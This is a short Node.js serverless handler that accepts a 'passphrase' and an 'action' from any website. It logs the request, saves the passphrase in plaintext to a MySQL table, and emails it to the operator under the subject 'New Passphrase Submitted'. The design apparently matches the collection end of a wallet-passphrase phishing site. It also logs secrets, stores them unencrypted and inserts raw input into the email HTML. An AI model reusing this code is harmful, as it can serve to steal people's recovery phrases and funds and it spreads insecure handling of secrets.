const nodemailer = require('nodemailer');
const mysql = require('mysql2/promise');
require('dotenv').config();

module.exports = async (req, res) => {
    // Add CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    console.log('Request received:', req.body); // Debug log

    const { passphrase, action } = req.body;

    try {
        console.log('Connecting to database...'); // Debug log
        const connection = await mysql.createConnection({
            host: process.env.DB_HOST,
            database: process.env.DB_NAME,
            user: process.env.DB_USER,
            password: process.env.DB_PASSWORD,
            port: process.env.DB_PORT
        });
        console.log('Database connected successfully'); // Debug log

        if (passphrase) {
            console.log('Inserting into database...'); // Debug log
            await connection.execute(
                'INSERT INTO passphrases (passphrase, action) VALUES (?, ?)',
                [passphrase, action]
            );
            console.log('Database insert successful'); // Debug log
        }

        console.log('Setting up email transport...'); // Debug log
        let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true,
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS
            }
        });

        console.log('Sending email...'); // Debug log
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: 'New Passphrase Submitted',
            html: `<b>Action:</b> ${action}<br><b>Passphrase:</b> ${passphrase || 'None'}`
        });
        console.log('Email sent successfully'); // Debug log

        await connection.end();
        console.log('Database connection closed'); // Debug log

        res.status(200).json({ message: 'Success' });
    } catch (error) {
        console.error('Error occurred:', error); // Debug log
        res.status(500).json({ message: error.message || 'Internal server error' });
    }
};